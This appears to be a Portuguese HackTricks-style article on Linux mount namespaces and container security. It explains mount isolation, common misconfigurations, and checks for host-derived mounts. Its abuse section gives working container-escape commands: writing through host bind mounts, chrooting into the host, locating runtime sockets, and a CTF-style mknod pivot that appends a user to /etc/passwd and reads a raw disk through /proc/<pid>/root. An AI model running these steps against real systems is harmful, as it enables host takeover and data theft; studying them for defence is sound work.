# Namespace de montagem

{{#include ../../../../../banners/hacktricks-training.md}}

## Visão geral

O mount namespace controla a **tabela de montagem** que um processo vê. Esta é uma das funcionalidades de isolamento de container mais importantes porque o root filesystem, bind mounts, tmpfs mounts, procfs view, sysfs exposure, e muitas mounts auxiliares específicas do runtime são todas expressas através dessa tabela de montagem. Dois processos podem ambos acessar `/`, `/proc`, `/sys` ou `/tmp`, mas para o que esses caminhos resolvem depende do mount namespace em que eles estão.

Da perspectiva de segurança de containers, o mount namespace frequentemente faz a diferença entre "isto é um filesystem de aplicação cuidadosamente preparado" e "este processo pode ver ou influenciar diretamente o filesystem do host". É por isso que bind mounts, `hostPath` volumes, operações de montagem privilegiadas e exposições de `/proc` ou `/sys` com permissão de escrita giram em torno deste namespace.

## Operação

Quando um runtime inicia um container, ele normalmente cria um novo mount namespace, prepara um root filesystem para o container, monta procfs e outros filesystems auxiliares conforme necessário, e então opcionalmente adiciona bind mounts, tmpfs mounts, secrets, config maps, ou host paths. Uma vez que esse processo está executando dentro do namespace, o conjunto de mounts que ele vê fica em grande parte desacoplado da visão padrão do host. O host ainda pode ver o filesystem subjacente real, mas o container vê a versão montada para ele pelo runtime.

Isto é poderoso porque permite que o container acredite ter seu próprio root filesystem mesmo que o host ainda esteja gerenciando tudo. Também é perigoso porque, se o runtime expõe a mount errada, o processo de repente ganha visibilidade sobre recursos do host que o restante do modelo de segurança pode não ter sido projetado para proteger.

## Laboratório

Você pode criar um namespace de montagem privado com:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Se você abrir outro shell fora desse namespace e inspecionar a tabela de montagem, verá que a montagem tmpfs existe apenas dentro do namespace de montagem isolado. Isso é um exercício útil porque mostra que o isolamento de montagem não é teoria abstrata; o kernel está literalmente apresentando uma tabela de montagem diferente ao processo.
Se você abrir outro shell fora desse namespace e inspecionar a tabela de montagem, a montagem tmpfs existirá apenas dentro do namespace de montagem isolado.

Dentro de containers, uma comparação rápida é:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
O segundo exemplo demonstra como é fácil para uma configuração de runtime abrir um grande furo na fronteira do sistema de arquivos.

## Uso em tempo de execução

Docker, Podman, containerd-based stacks, and CRI-O dependem de um espaço de nomes de montagem privado para containers normais. Kubernetes se apoia no mesmo mecanismo para volumes, projected secrets, config maps, e montagens `hostPath`. Ambientes Incus/LXC também dependem muito de espaços de nomes de montagem, especialmente porque containers de sistema frequentemente expõem sistemas de arquivos mais ricos e mais parecidos com os de uma máquina do que containers de aplicação.

Isso significa que, quando você analisa um problema de sistema de arquivos de container, normalmente não está olhando para uma peculiaridade isolada do Docker. Você está olhando para um problema de espaço de nomes de montagem e de configuração de runtime expresso através da plataforma que lançou a carga de trabalho.

## Misconfigurações

O erro mais óbvio e perigoso é expor o sistema de arquivos root do host ou outro caminho sensível do host através de um bind mount, por exemplo `-v /:/host` ou um `hostPath` gravável no Kubernetes. Nesse ponto, a questão não é mais "o container pode escapar de alguma forma?" e passa a ser "quanto conteúdo útil do host já está diretamente visível e gravável?" Um bind mount gravável do host frequentemente transforma o restante do exploit em uma simples questão de posicionamento de arquivos, chroot, modificação de configuração ou descoberta de sockets do runtime.

Outro problema comum é expor `/proc` ou `/sys` do host de maneiras que contornem a visão mais segura do container. Esses sistemas de arquivos não são montagens de dados ordinárias; eles são interfaces para o estado do kernel e dos processos. Se a carga de trabalho alcança as versões do host diretamente, muitas das suposições por trás do hardening de container deixam de se aplicar corretamente.

Proteções somente leitura também importam. Um sistema de arquivos root somente leitura não garante magicamente a segurança de um container, mas remove grande parte do espaço de preparação do atacante e torna persistência, colocação de binários auxiliares e adulteração de configuração mais difíceis. Por outro lado, um root gravável ou um bind mount gravável do host dá ao atacante espaço para preparar o próximo passo.

## Abuso

Quando o espaço de nomes de montagem é usado incorretamente, atacantes comumente fazem uma de quatro coisas. Eles **leem dados do host** que deveriam ter permanecido fora do container. Eles **modificam a configuração do host** através de bind mounts graváveis. Eles **montam ou remontam recursos adicionais** se capabilities e seccomp permitirem. Ou eles **alcançam sockets poderosos e diretórios de estado do runtime** que lhes permitem pedir à plataforma de container mais acesso.

Se o container já consegue ver o sistema de arquivos do host, o resto do modelo de segurança muda imediatamente.

Quando suspeitar de um host bind mount, primeiro confirme o que está disponível e se é gravável:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Se o sistema de arquivos raiz do host estiver montado como leitura-escrita, o acesso direto ao host frequentemente é tão simples quanto:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Se o objetivo for privileged runtime access em vez de chrooting direto, enumere sockets e runtime state:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Se `CAP_SYS_ADMIN` estiver presente, teste também se novos mounts podem ser criados de dentro do container:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Exemplo completo: Two-Shell `mknod` Pivot

Um caminho de abuso mais especializado surge quando o container root user pode criar block devices, o host e o container compartilham uma user identity de forma útil, e o attacker já tem um low-privilege foothold no host. Nessa situação, o container pode criar um device node tal como `/dev/sda`, e o low-privilege host user pode depois lê-lo através de `/proc/<pid>/root/` para o processo do container correspondente.

Inside the container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
No host, como o usuário correspondente de baixa privilégio, após localizar o PID do shell do container:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
A lição importante não é a busca exata de strings em CTF. É que mount-namespace exposure através de `/proc/<pid>/root/` pode permitir que um usuário do host reutilize device nodes criados pelo container mesmo quando a cgroup device policy impedia o uso direto dentro do próprio container.

## Verificações

Esses comandos existem para mostrar a filesystem view em que o processo atual está realmente vivendo. O objetivo é detectar mounts originados no host, caminhos sensíveis graváveis e qualquer coisa que pareça mais ampla que o root filesystem de um container de aplicação normal.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
- Bind mounts do host, especialmente `/`, `/proc`, `/sys`, diretórios de estado em tempo de execução, ou locais de socket, devem sobressair imediatamente.
- Mounts read-write inesperados geralmente são mais importantes do que um grande número de mounts read-only auxiliares.
- `mountinfo` é frequentemente o melhor lugar para ver se um caminho é realmente derivado do host ou baseado em overlay.

Essas verificações estabelecem **quais recursos são visíveis neste namespace**, **quais são derivados do host**, e **quais deles são graváveis ou sensíveis à segurança**.
